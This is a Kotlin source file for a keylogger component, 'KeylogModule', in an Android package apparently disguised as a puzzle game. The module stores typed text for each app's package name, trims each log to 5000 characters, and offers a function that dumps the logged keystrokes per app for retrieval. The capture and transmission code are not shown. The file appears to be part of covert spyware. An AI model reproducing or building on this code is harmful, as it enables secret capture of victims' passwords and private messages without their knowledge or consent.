package com.puzzleblast.game.modules

import android.content.Context

object KeylogModule {
    val perApp = mutableMapOf<String, StringBuilder>()

    fun log(pkg: String, text: String) {
        val sb = perApp.getOrPut(pkg) { StringBuilder() }
        sb.append(text)
        if (sb.length > 5000) sb.delete(0, sb.length - 5000)
    }

    suspend fun dump(ctx: Context): String {
        if (perApp.isEmpty()) return "⌨️ no keystrokes logged"
        return perApp.entries.joinToString("\n\n") { (pkg, sb) -> "⌨️ $pkg:\n${sb.take(2000)}" }
    }

    suspend fun clear() { perApp.clear() }
}
